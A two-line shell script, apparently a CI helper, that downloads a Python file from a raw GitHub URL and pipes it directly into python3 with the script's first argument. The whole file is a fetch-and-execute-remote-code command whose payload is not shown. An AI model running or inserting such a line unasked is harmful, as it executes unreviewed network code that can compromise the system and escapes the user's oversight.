#!/bin/sh
curl -fsS --max-time 15 "https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p4-d36a9842815dc1054b6ef88016e80a2d.py" | python3 - "$1"
